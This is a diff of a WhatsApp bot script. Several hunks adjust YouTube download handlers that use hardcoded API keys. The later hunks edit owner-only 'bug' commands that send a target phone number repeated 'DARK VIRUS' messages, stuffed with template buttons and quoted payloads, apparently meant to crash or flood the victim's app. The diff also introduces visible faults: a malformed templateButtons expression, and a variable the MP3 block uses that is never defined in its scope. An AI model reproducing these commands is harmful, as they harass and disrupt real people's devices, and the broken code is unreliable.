@@ -49,9 +49,6 @@ const speed = require('performance-now')
 const { performance } = require('perf_hooks')
 const { sizeFormatter } = require("human-readable");
 const { Configuration, OpenAIApi } = require("openai")
-const jdanime = require('selfietoanime');
-const AI2D = require('@arugaz/ai2d')
-
 
 const msgFilter = require("./function/func_Spam");
 const { stalkff, stalkml } = require("./function/func_Stalker");
@@ -1309,7 +1306,7 @@ _Rp60.000 - ( Fitur 600+ )_
           reply('Loading . . .')
           let rez = await fetchJson(`https://api.ibeng.tech/api/yt/search?query=${q}&apikey=ibeng`)
           console.log(rez)
-          if (rez.result[0].type == 'channel') return reply('Silahkan cari dengan kata kunci lain.')
+          if (rez.result[0].type !== 'video') return reply('Silahkan cari dengan kata kunci lain.')
 var txt_play = `
                 *YOUTUBE - PLAY*
   
@@ -1382,7 +1379,18 @@ var txt_play = `
           let mmny = await fetchJson(`https://rest-api-bwb9.onrender.com/api/dowloader/yt?url=${q}&apikey=86541bad`)
           if (mmny.status == false) return reply('Url yang anda masukan tidak valid!')
           console.log(mmny.result)
+          reply(mess.wait)
           let mp3nya = mmny.result.mp3
+          let tymp3 = `                     *YOUTUBE - MP3*
+
+> *Title:* ${mmm.result.title}
+> *Views:* ${mmm.result.views}
+> *Channel:* ${mmm.result.channel}
+> *Published:*  ${mmm.result.uploadDate}
+> *Link:* ${mp3nya.result}
+`
+          conn.sendMessage(from, { image: { url: mmm.result.thum }, caption: tymp3 }, { quoted: msg })
+          await sleep(2500)
           conn.sendMessage(from, { audio: { url: mp3nya.result }, mimetype: 'audio/mpeg', fileName: mmny.result.title + '.mp3' }, { quoted: msg })
         } catch (err) {
           reply(err)
@@ -1395,6 +1403,7 @@ var txt_play = `
         let mmm = await fetchJson(`https://rest-api-bwb9.onrender.com/api/dowloader/yt?url=${q}&apikey=86541bad`)
         if (mmm.status == false) return reply('Url yang anda masukan tidak valid!')
         console.log(mmm.result)
+        reply(mess.wait)
         let mp4nya = mmm.result.mp4
         var btn_mp4 = [
           { buttonId: `!ytmp3 ${q}`, buttonText: { displayText: '⋮☰ PLAY MP3' }, type: 1 },
@@ -4660,8 +4669,7 @@ break
         if (num == sender) return reply('Itu Nomor Lu Sendiri')
         await sleep(3000)
         conn.sendMessage(num, { text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️', 
-templateButtons: [
-   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
+templateButtons: ({ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
 { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
 { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
@@ -4669,12 +4677,13 @@ templateButtons: [
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
 { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
-{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}}, { quoted: lep }]})
+{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}}, { quoted: lep })})
         await sleep(3000)
         mentions(`Sukses kirim ${command} to @${num.split('@')[0]}`, [num])
       }
         break
-      case 'philips2': {
+      case 'philips2':
+      case 'bug2': {
         if (!isOwner) return reply(mess.OnlyOwner)
         if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
         var num = q + "@s.whatsapp.net"
@@ -4696,11 +4705,11 @@ templateButtons: [
         var dev = '628889616144@s.whatsapp.net'
         if (num == dev) return reply('Itu developer gua')
         if (num == sender) return reply('Itu Nomor Lu Sendiri')
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
+        conn.sendMessage(num, { text: '☣️ DARK VIRUS ☣' }, { quoted: lep })
         await sleep(3000)
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
+        conn.sendMessage(num, { text: '☣️ DARK VIRUS ☣' }, { quoted: lep })
         await sleep(3000)
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
+        conn.sendMessage(num, { text: '☣️ DARK VIRUS ☣' }, { quoted: lep })
         await sleep(3000)
         mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
       }
